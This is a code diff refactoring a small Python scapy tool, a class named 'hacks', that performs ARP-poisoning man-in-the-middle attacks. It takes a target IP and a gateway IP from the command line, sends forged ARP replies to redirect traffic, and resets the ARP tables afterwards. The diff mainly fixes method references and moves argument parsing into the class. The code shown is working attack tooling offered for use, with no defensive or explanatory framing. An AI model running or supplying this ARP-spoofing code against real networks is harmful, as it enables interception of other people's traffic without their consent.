@@ -7,19 +7,20 @@ import optparse
 class hacks:
     
 
-    def switcher(self,options):
-        match options.approach_method:
+    def switcher(self):
+        args = self.get_input()
+        match args.approach_method:
             case "mitm":
-                if not options.target_ip:
+                if not args.target_ip:
                     print("Enter Target ip")
                     exit(0)
-                if not options.gateway_ip:
+                if not args.gateway_ip:
                     print("Enter gateway ip")
                     exit(0)
-                self.mitm(options.target_ip, options.gateway_ip)
+                self.mitm(args.target_ip, args.gateway_ip)
 
             case default:
-                if not options.approach_method:
+                if not args.approach_method:
                     print("enter approach")
                 else:
                     print("Not yet supported")
@@ -51,15 +52,14 @@ class hacks:
         return answered_list[0][1].hwsrc
 
     def arp_poison(self, target, target2):
-        packet = scapy.ARP(op=2 ,psrc = target, pdst=target2, hwdst = get_mac_address(target))
+        packet = scapy.ARP(op=2 ,psrc = target, pdst=target2, hwdst = self.get_mac_address(target))
         scapy.send(packet, verbose = False)
     
     def reset_ops(self, target1, target2):
         reset_arp= scapy.ARP(op=2, psrc= target1, pdst=target2, hwsrc=self.get_mac_address(target1), hwdst=self.get_mac_address(target2))
         scapy.send(reset_arp, verbose=False, count=6)
 
-if __name__ == '__main__':
-    def get_input():
+    def get_input(self):
         parse_object = optparse.OptionParser()
         parse_object.add_option("-a", "--attack", dest = "approach_method", help="Select which way to attack")
         parse_object.add_option("-t", "--target", dest = "target_ip", help="Enter Target ip")
@@ -67,4 +67,9 @@ if __name__ == '__main__':
         
         options = parse_object.parse_args()[0]
         return options
-    hacks.switcher(get_input())
+
+if __name__ == '__main__':
+
+    obj = hacks()
+    obj.switcher()
+    
